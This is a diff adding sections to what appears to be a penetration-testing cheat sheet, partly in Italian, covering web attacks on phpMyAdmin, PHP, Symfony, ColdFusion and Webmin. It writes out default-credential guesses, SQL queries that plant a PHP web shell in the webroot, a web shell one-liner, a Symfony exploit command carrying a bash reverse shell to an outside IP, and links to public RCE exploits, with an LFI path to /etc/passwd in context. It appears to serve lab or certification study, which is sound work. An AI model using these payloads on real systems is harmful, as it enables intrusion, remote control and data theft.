@@ -3413,6 +3413,43 @@ Drupalgeddon
 - LFI: `http://192.168.243.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../../etc/passwd&_=1588451710324`
 
 
+#### <ins>phpMyAdmin</ins>
+
+- Se presente, testare `root` senza password. Se non funziona, utilizzare root:password
+- Se si riesce a fare login, si pu`o fare RCE con la seguente query
+  SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"
+  SELECT LOAD_FILE('C:\\xampp\\htdocs\\nc.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
+  
+  
+#### <ins>PHP</ins>
+
+- Command Execution - `preg_replace()` PHP Function Exploit - RCE https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
+- `<?php echo system($_GET['cmd']); ?>`
+- [Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
+
+
+#### <ins>Symphony</ins>
+
+- [Symphony | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony)
+- http://victim.com/app_dev.php/_profiler/open?file=app/config/parameters.yml
+  - get the 'secret'
+- https://github.com/ambionics/symfony-exploits
+  - `python3 secret_fragment_exploit.py 'http://192.168.164.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.164.233/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/192.168.45.154/80 0>&1'"`
+
+
+#### <ins>Adobe ColdFusion</ins>
+
+- See if you find `/CFIDE` or `.cfm` pages
+- It usually runs on port `8500`
+- RCE: https://www.exploit-db.com/exploits/50057
+
+
+#### <ins>Webmin</ins>
+
+- https://github.com/MuirlandOracle/CVE-2019-15107
+  - type 'shell' to get a reverse shell (use ncat with rlwrap)
+
+
 ## Client-Side Attacks
 
 ### <ins>Client Information Gathering</ins>
